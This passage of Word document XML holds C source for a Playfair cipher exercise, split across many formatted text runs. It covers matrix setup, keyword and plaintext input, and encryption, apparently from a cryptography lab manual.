          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>em</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>); vo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>d d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>sp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ayMa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x(); vo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>d encryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>vo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>d searchMa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">char </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x[5][5],keyword[25],p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>[25],c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>[25],f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ag[26];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ro</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-15"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>,co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>,row1,c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>1,row2,co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>2;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>vo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rP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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>z</w:t>
      </w:r>
      <w:r>
        <w:t>e();</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810" w:right="5887"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er Keyword:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>"); scanf("%s",keyword); pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>"); scanf("%s",p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>; f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>Ma</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1280" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>encry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>();</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="74"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>sp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ayM</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x();</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>nC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>phe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">%s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n",c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>phe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</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00"/>
      </w:pPr>
      <w:r>
        <w:t>vo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>ze()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5" w:line="260" w:lineRule="exact"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="12" w:line="240" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="29"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>for(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;i</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;26</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ag[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>]=0;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>for(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;i</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:t>for(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;j</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;j</w:t>
      </w:r>
      <w:r>
        <w:t>++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="2228"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>]=0;</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t>vo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>d f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>Ma</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x()</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nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>k=0,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>,p,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>=0,n,va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
